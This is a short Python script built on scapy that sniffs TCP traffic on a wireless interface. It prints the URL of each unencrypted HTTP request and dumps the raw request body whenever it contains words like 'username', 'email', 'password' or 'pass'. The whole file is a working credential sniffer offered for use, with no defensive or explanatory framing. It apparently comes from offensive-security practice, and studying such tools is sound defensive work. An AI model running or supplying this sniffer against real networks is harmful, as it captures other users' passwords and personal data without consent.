#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_packet, filter="tcp")

#process the packet received by scapy.sniff called by prn
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #printing url
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(scapy.Raw):
            #printing interesting stuff
            load = packet[scapy.Raw].load
            keywords = ["username","uname","user","id","email","password","pass","code"]
            for keyword in keywords:
                if keyword in load:
                    print(packet[scapy.Raw].load + "\n\n")

sniff("wlp3s0")
